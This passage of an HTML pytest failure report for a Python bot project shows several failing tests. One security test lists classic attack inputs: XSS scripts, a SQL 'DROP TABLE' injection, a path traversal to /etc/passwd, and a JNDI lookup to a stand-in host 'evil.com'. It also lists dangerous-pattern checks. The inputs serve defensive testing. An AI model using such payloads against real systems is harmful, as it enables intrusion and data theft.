(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_vendor/rich/live.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_internal/utils/filesystem.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_internal/utils/filesystem.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/tbl/demo.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/cluster/kmeans.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/parse/pchart.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/parse/pchart.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/metrics/scores.py&#x27;, &#x27;from\\s+random\\s+import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/app/chunkparser_app.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/misc/sort.py&#x27;, &#x27;from\\s+random\\s+import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/misc/chomsky.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/misc/wordfinder.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/misc/wordfinder.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/misc/wordfinder.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/classify/util.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/sentiment/util.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/chat/util.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/chat/util.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/tag/perceptron.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/tag/hmm.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/lm/api.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/draw/tree.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/draw/tree.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/draw/util.py&#x27;, &#x27;from\\s+random\\s+import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/rdtypes/util.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/setuptools/_vendor/more_itertools/recipes.py&#x27;, &#x27;from\\s+random\\s+import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/setuptools/_vendor/more_itertools/more.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/setuptools/_vendor/more_itertools/more.py&#x27;, &#x27;from\\s+random\\s+import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/setuptools/_vendor/jaraco/collections/__init__.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/setuptools/_vendor/jaraco/collections/__init__.py&#x27;, &#x27;random\\.random\\(\\)&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/setuptools/_vendor/jaraco/collections/__init__.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/setuptools/_vendor/jaraco/collections/__init__.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/rsa.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/rsa.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/__init__.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/__init__.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/internet/__init__.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/internet/__init__.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/date_time/__init__.py&#x27;, &#x27;random\\.random\\(\\)&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/date_time/__init__.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/date_time/__init__.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/misc/__init__.py&#x27;, &#x27;random\\.random\\(\\)&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/misc/__init__.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/misc/__init__.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/user_agent/__init__.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/user_agent/__init__.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/address/en_US/__init__.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/address/en_IN/__init__.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/address/en_MS/__init__.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/address/en_MS/__init__.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/automotive/uk_UA/__init__.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/providers/automotive/uk_UA/__init__.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/docker/api/build.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/locust/user/task.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/locust/user/task.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/locust/user/task.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/auth/server.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/scan/fun_mode/easter_eggs.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/scan/fun_mode/easter_eggs.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/scan/fun_mode/easter_eggs.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/src/events/bus.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/src/events/bus.py&#x27;, &#x27;random\\.random\\(\\)&#x27;), (&#x27;/home/azureuser/repos/yabot/src/modules/emotional/memory_service.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/src/modules/emotional/memory_service.py&#x27;, &#x27;random\\.choice\\(&#x27;)]</span><br/><span class="error">E       assert 131 == 0</span><br/><span class="error">E        +  where 131 = len([(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/coverage/sqldata.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home...\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/sentinel.py&#x27;, &#x27;import\\s+random\\b&#x27;), ...])</span><br/><br/>tests/security/test_vulnerability_scanning.py:259: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_vulnerability_scanning.py::TestVulnerabilityScanning::test_input_validation_completeness</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_vulnerability_scanning.TestVulnerabilityScanning object at 0x7d1701568200&gt;<br/><br/>    @pytest.mark.security<br/>    def test_input_validation_completeness(self):<br/>        &quot;&quot;&quot;Test that input validation is comprehensive.&quot;&quot;&quot;<br/>        from src.utils.validators import InputValidator<br/>    <br/>        # Test various malicious inputs<br/>        malicious_inputs = [<br/>            &quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;,<br/>            &quot;&#x27;; DROP TABLE users; --&quot;,<br/>            &quot;../../../etc/passwd&quot;,<br/>            &quot;${jndi:ldap://evil.com/exploit}&quot;,<br/>            &quot;javascript:alert(&#x27;xss&#x27;)&quot;,<br/>            &quot;&lt;img src=x onerror=alert(&#x27;xss&#x27;)&gt;&quot;,<br/>            &quot;data:text/html,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;,<br/>        ]<br/>    <br/>        for malicious_input in malicious_inputs:<br/>            sanitized = InputValidator.sanitize_html_input(malicious_input)<br/>    <br/>            # Check that dangerous patterns are removed<br/>            dangerous_patterns = [<br/>                &#x27;&lt;script&#x27;, &#x27;javascript:&#x27;, &#x27;onerror=&#x27;, &#x27;DROP TABLE&#x27;, &#x27;../&#x27;, &#x27;jndi:&#x27;, &#x27;data:&#x27;<br/>            ]<br/>    <br/>            for pattern in dangerous_patterns:<br/>&gt;               assert pattern.lower() not in sanitized.lower(), f&quot;Dangerous pattern &#x27;{pattern}&#x27; not removed from: {sanitized}&quot;<br/><span class="error">E               AssertionError: Dangerous pattern &#x27;DROP TABLE&#x27; not removed from: &#x27;; DROP TABLE users; --</span><br/><span class="error">E               assert &#x27;drop table&#x27; not in &quot;&#x27;; drop table users; --&quot;</span><br/><span class="error">E                 &#x27;drop table&#x27; is contained here:</span><br/><span class="error">E                   &#x27;; drop table users; --</span><br/><br/>tests/security/test_vulnerability_scanning.py:312: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_delete_user_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_user.TestUserService object at 0x7d17015694c0&gt;<br/>user_service = &lt;src.services.user.UserService object at 0x7d16f8dacc20&gt;<br/>mock_database_manager = (&lt;Mock spec=&#x27;DatabaseManager&#x27; id=&#x27;137537617853808&#x27;&gt;, &lt;Mock name=&#x27;mock.get_sqlite_conn()&#x27; id=&#x27;137537617848432&#x27;&gt;, &lt;Mock ...).cursor()&#x27; id=&#x27;137537617845264&#x27;&gt;, &lt;Mock name=&#x27;mock.get_mongo_db()&#x27; id=&#x27;137537617849344&#x27;&gt;, &lt;Mock id=&#x27;137537617848576&#x27;&gt;)<br/>mock_event_bus = &lt;Mock spec=&#x27;EventBus&#x27; id=&#x27;137537617839552&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_delete_user_success(self, user_service, mock_database_manager, mock_event_bus):<br/>        &quot;&quot;&quot;Test successful user deletion.&quot;&quot;&quot;<br/>        mock_db_manager, mock_sqlite_conn, mock_sqlite_cursor, mock_mongo_db, mock_users_collection = mock_database_manager<br/>    <br/>        # Mock successful deletions<br/>        mock_sqlite_cursor.rowcount = 1<br/>        mock_sqlite_conn.commit.return_value = None<br/>        mock_delete_result = Mock()<br/>        mock_delete_result.deleted_count = 1<br/>        mock_users_collection.delete_one.return_value = mock_delete_result<br/>    <br/>        # Call the method<br/>        result = await user_service.delete_user(&quot;test_user_123&quot;, &quot;test_reason&quot;)<br/>    <br/>        # Verify SQLite deletion<br/>&gt;       assert mock_sqlite_cursor.execute.call_count == 1<br/><span class="error">E       AssertionError: assert 2 == 1</span><br/><span class="error">E        +  where 2 = &lt;Mock name=&#x27;mock.get_sqlite_conn().cursor().execute&#x27; id=&#x27;137537617840464&#x27;&gt;.call_count</span><br/><span class="error">E        +    where &lt;Mock name=&#x27;mock.get_sqlite_conn().cursor().execute&#x27; id=&#x27;137537617840464&#x27;&gt; = &lt;Mock name=&#x27;mock.get_sqlite_conn().cursor()&#x27; id=&#x27;137537617845264&#x27;&gt;.execute</span><br/><br/>tests/services/test_user.py:330: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.services.user:user.py:312 Error retrieving user profile from SQLite: &#x27;Mock&#x27; object is not iterable<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_publish_redis_failure_queue_locally</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_event_bus.TestEventBus object at 0x7d1701591700&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_publish_redis_failure_queue_locally(self):<br/>        &quot;&quot;&quot;Test publishing with Redis failure that queues locally.&quot;&quot;&quot;<br/>        with patch(&#x27;src.events.bus.ConfigManager&#x27;) as mock_config_class:<br/>            mock_config = Mock()<br/>            mock_config.get_redis_config.return_value = Mock(<br/>                redis_url=&quot;redis://localhost:6379&quot;,<br/>                redis_password=None<br/>            )<br/>            mock_config_class.return_value = mock_config<br/>    <br/>            with patch(&#x27;src.events.bus.aioredis.from_url&#x27;) as mock_redis:<br/>                mock_redis_client = AsyncMock()<br/>                mock_redis_client.ping = AsyncMock(return_value=True)<br/>                mock_redis_client.publish = AsyncMock(side_effect=Exception(&quot;Redis error&quot;))<br/>                mock_redis.return_value = mock_redis_client<br/>    <br/>                # Mock the persistence methods<br/>                with patch.object(EventBus, &#x27;_persist_events&#x27;) as mock_persist:<br/>                    event_bus = EventBus()<br/>                    await event_bus.connect()<br/>    <br/>                    # Test publishing an event<br/>                    payload = {&quot;user_id&quot;: &quot;12345&quot;, &quot;action&quot;: &quot;test&quot;}<br/>                    result = await event_bus.publish(&quot;test_event&quot;, payload)<br/>    <br/>&gt;                   assert result is True  # Should still succeed as it&#x27;s queued locally<br/><span class="error">E                   assert False is True</span><br/><br/>tests/unit/test_event_bus.py:173: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-504&#x27; coro=&lt;EventBus._flush_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:446&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-505&#x27; coro=&lt;EventBus._retry_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:459&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
WARNING  src.events.bus:bus.py:545 Redis publish failed: Redis error<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_besitos_awarded_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_event_models.TestEventModels object at 0x7d1701593080&gt;<br/><br/>    def test_besitos_awarded_event(self):<br/>        &quot;&quot;&quot;Test BesitosAwardedEvent model.&quot;&quot;&quot;<br/>&gt;       event = BesitosAwardedEvent(<br/>            event_id=str(uuid.uuid4()),<br/>            event_type=&quot;besitos_awarded&quot;,<br/>            timestamp=datetime.utcnow(),<br/>            correlation_id=str(uuid.uuid4()),<br/>            user_id=&quot;12345&quot;,<br/>            amount=10,<br/>            reason=&quot;reaction_reward&quot;,<br/>            metadata={&quot;content_id&quot;: &quot;content_001&quot;}<br/>        )<br/><span class="error">E       pydantic_core._pydantic_core.ValidationError: 3 validation errors for BesitosAwardedEvent</span><br/><span class="error">E       source</span><br/><span class="error">E         Field required [type=missing, input_value={&#x27;event_id&#x27;: &#x27;b32f59b2-db...ent_id&#x27;: &#x27;content_001&#x27;}}, input_type=dict]</span><br/><span class="error">E           For further information visit https://errors.pydantic.dev/2.9/v/missing</span><br/><span class="error">E       balance_after</span><br/><span class="error">E         Field required [type=missing, input_value={&#x27;event_id&#x27;: &#x27;b32f59b2-db...ent_id&#x27;: &#x27;content_001&#x27;}}, input_type=dict]</span><br/><span class="error">E           For further information visit https://errors.pydantic.dev/2.9/v/missing</span><br/><span class="error">E       transaction_id</span><br/><span class="error">E         Field required [type=missing, input_value={&#x27;event_id&#x27;: &#x27;b32f59b2-db...ent_id&#x27;: &#x27;content_001&#x27;}}, input_type=dict]</span><br/><span class="error">E           For further information visit https://errors.pydantic.dev/2.9/v/missing</span><br/><br/>tests/unit/test_event_models.py:144: ValidationError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_stop_processing_with_task</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;Mock name=&#x27;mock.cancel&#x27; id=&#x27;137537615944000&#x27;&gt;<br/><br/>    def assert_called_once(self):<br/>        &quot;&quot;&quot;assert that the mock was called only once.<br/>        &quot;&quot;&quot;<br/>        if not self.call_count == 1:<br/>            msg = (&quot;Expected &#x27;%s&#x27; to have been called once. Called %s times.%s&quot;<br/>                   % (self._mock_name or &#x27;mock&#x27;,<br/>                      self.call_count,<br/>                      self._calls_repr()))<br/>&gt;           raise AssertionError(msg)<br/><span class="error">E           AssertionError: Expected &#x27;cancel&#x27; to have been called once. Called 0 times.</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:923: AssertionError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_event_processor.TestEventProcessor object at 0x7d17015b8cb0&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_stop_processing_with_task(self):<br/>        &quot;&quot;&quot;Test stopping event processing with running task.&quot;&quot;&quot;<br/>        mock_event_bus = Mock(spec=EventBus)<br/>        event_processor = EventProcessor(mock_event_bus)<br/>    <br/>        # Start processing first<br/>        with patch.object(EventProcessor, &#x27;_register_default_handlers&#x27;):<br/>            await event_processor.start_processing()<br/>            assert event_processor.is_processing is True<br/>    <br/>            # Create a mock processing task<br/>            mock_task = AsyncMock()<br/>            mock_task.done.return_value = False<br/>            mock_task.cancel = Mock()<br/>            event_processor._processing_task = mock_task<br/>    <br/>            # Stop processing<br/>            result = await event_processor.stop_processing()<br/>            assert result is True<br/>            assert event_processor.is_processing is False<br/>&gt;           mock_task.cancel.assert_called_once()<br/><span class="error">E           AssertionError: Expected &#x27;cancel&#x27; to have been called once. Called 0 times.</span><br/><br/>tests/unit/test_event_processor.py:86: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_register_handler_exception</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;unittest.mock._patch object at 0x7d16f8bdd520&gt;<br/><br/>    def __enter__(self):<br/>        &quot;&quot;&quot;Perform the patch.&quot;&quot;&quot;<br/>        new, spec, spec_set = self.new, self.spec, self.spec_set<br/>        autospec, kwargs = self.autospec, self.kwargs<br/>        new_callable = self.new_callable<br/>        self.target = self.getter()<br/>    <br/>        # normalise False to None<br/>        if spec is False:<br/>            spec = None<br/>        if spec_set is False:<br/>            spec_set = None<br/>        if autospec is False:<br/>            autospec = None<br/>    <br/>        if spec is not None and autospec is not None:<br/>            raise TypeError(&quot;Can&#x27;t specify spec and autospec&quot;)<br/>        if ((spec is not None or autospec is not None) and<br/>            spec_set not in (True, None)):<br/>            raise TypeError(&quot;Can&#x27;t provide explicit spec_set *and* spec or autospec&quot;)<br/>    <br/>        original, local = self.get_original()<br/>    <br/>        if new is DEFAULT and autospec is None:<br/>            inherit = False<br/>            if spec is True:<br/>                # set spec to the object we are replacing<br/>                spec = original<br/>                if spec_set is True:<br/>                    spec_set = original<br/>                    spec = None<br/>            elif spec is not None:<br/>                if spec_set is True:<br/>                    spec_set = spec<br/>                    spec = None<br/>            elif spec_set is True:<br/>                spec_set = original<br/>    <br/>            if spec is not None or spec_set is not None:<br/>                if original is DEFAULT:<br/>                    raise TypeError(&quot;Can&#x27;t use &#x27;spec&#x27; with create=True&quot;)<br/>                if isinstance(original, type):<br/>                    # If we&#x27;re patching out a class and there is a spec<br/>                    inherit = True<br/>            if spec is None and _is_async_obj(original):<br/>                Klass = AsyncMock<br/>            else:<br/>                Klass = MagicMock<br/>            _kwargs = {}<br/>            if new_callable is not None:<br/>                Klass = new_callable<br/>            elif spec is not None or spec_set is not None:<br/>                this_spec = spec<br/>                if spec_set is not None:<br/>                    this_spec = spec_set<br/>                if _is_list(this_spec):<br/>                    not_callable = &#x27;__call__&#x27; not in this_spec<br/>                else:<br/>                    not_callable = not callable(this_spec)<br/>                if _is_async_obj(this_spec):<br/>                    Klass = AsyncMock<br/>                elif not_callable:<br/>                    Klass = NonCallableMagicMock<br/>    <br/>            if spec is not None:<br/>                _kwargs[&#x27;spec&#x27;] = spec<br/>            if spec_set is not None:<br/>                _kwargs[&#x27;spec_set&#x27;] = spec_set<br/>    <br/>            # add a name to mocks<br/>            if (isinstance(Klass, type) and<br/>                issubclass(Klass, NonCallableMock) and self.attribute):<br/>                _kwargs[&#x27;name&#x27;] = self.attribute<br/>    <br/>            _kwargs.update(kwargs)<br/>            new = Klass(**_kwargs)<br/>    <br/>            if inherit and _is_instance_mock(new):<br/>                # we can only tell if the instance should be callable if the<br/>                # spec is not a list<br/>                this_spec = spec<br/>                if spec_set is not None:<br/>                    this_spec = spec_set<br/>                if (not _is_list(this_spec) and not<br/>                    _instance_callable(this_spec)):<br/>                    Klass = NonCallableMagicMock<br/>    <br/>                _kwargs.pop(&#x27;name&#x27;)<br/>                new.return_value = Klass(_new_parent=new, _new_name=&#x27;()&#x27;,<br/>                                         **_kwargs)<br/>        elif autospec is not None:<br/>            # spec is ignored, new *must* be default, spec_set is treated<br/>            # as a boolean. Should we check spec is not None and that spec_set<br/>            # is a bool?<br/>            if new is not DEFAULT:<br/>                raise TypeError(<br/>                    &quot;autospec creates the mock for you. Can&#x27;t specify &quot;<br/>                    &quot;autospec and new.&quot;<br/>                )<br/>            if original is DEFAULT:<br/>                raise TypeError(&quot;Can&#x27;t use &#x27;autospec&#x27; with create=True&quot;)<br/>            spec_set = bool(spec_set)<br/>            if autospec is True:<br/>                autospec = original<br/>    <br/>            if _is_instance_mock(self.target):<br/>                raise InvalidSpecError(<br/>                    f&#x27;Cannot autospec attr {self.attribute!r} as the patch &#x27;<br/>                    f&#x27;target has already been mocked out. &#x27;<br/>                    f&#x27;[target={self.target!r}, attr={autospec!r}]&#x27;)<br/>            if _is_instance_mock(autospec):<br/>                target_name = getattr(self.target, &#x27;__name__&#x27;, self.target)<br/>                raise InvalidSpecError(<br/>                    f&#x27;Cannot autospec attr {self.attribute!r} from target &#x27;<br/>                    f&#x27;{target_name!r} as it has already been mocked out. &#x27;<br/>                    f&#x27;[target={self.target!r}, attr={autospec!r}]&#x27;)<br/>    <br/>            new = create_autospec(autospec, spec_set=spec_set,<br/>                                  _name=self.attribute, **kwargs)<br/>        elif kwargs:<br/>            # can&#x27;t set keyword args when we aren&#x27;t creating the mock<br/>            # XXXX If new is a Mock we could call new.configure_mock(**kwargs)<br/>            raise TypeError(&quot;Can&#x27;t pass kwargs to a mock we aren&#x27;t creating&quot;)<br/>    <br/>        new_attr = new<br/>    <br/>        self.temp_original = original<br/>        self.is_local = local<br/>        self._exit_stack = contextlib.ExitStack()<br/>        try:<br/>&gt;           setattr(self.target, self.attribute, new_attr)<br/><span class="error">E           AttributeError: &#x27;dict&#x27; object attribute &#x27;__setitem__&#x27; is read-only</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:1567: AttributeError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_event_processor.TestEventProcessor object at 0x7d17015b8f50&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_register_handler_exception(self):<br/>        &quot;&quot;&quot;Test registering event handlers with exception.&quot;&quot;&quot;<br/>        mock_event_bus = Mock(spec=EventBus)<br/>        event_processor = EventProcessor(mock_event_bus)<br/>    <br/>        # Mock an exception during handler registration<br/>&gt;       with patch.object(event_processor._handlers, &#x27;__setitem__&#x27;, side_effect=Exception(&quot;Test error&quot;)):<br/><br/>tests/unit/test_event_processor.py:109: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/>/usr/lib/python3.12/unittest/mock.py:1580: in __enter__<br/>    if not self.__exit__(*sys.exc_info()):<br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;unittest.mock._patch object at 0x7d16f8bdd520&gt;<br/>exc_info = (&lt;class &#x27;AttributeError&#x27;&gt;, AttributeError(&quot;&#x27;dict&#x27; object attribute &#x27;__setitem__&#x27; is read-only&quot;), &lt;traceback object at 0x7d16d4c18a80&gt;)<br/><br/>    def __exit__(self, *exc_info):<br/>        &quot;&quot;&quot;Undo the patch.&quot;&quot;&quot;<br/>        if self.is_local and self.temp_original is not DEFAULT:<br/>            setattr(self.target, self.attribute, self.temp_original)<br/>        else:<br/>&gt;           delattr(self.target, self.attribute)<br/><span class="error">E           AttributeError: &#x27;dict&#x27; object attribute &#x27;__setitem__&#x27; is read-only</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:1588: AttributeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_handle_besitos_awarded</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
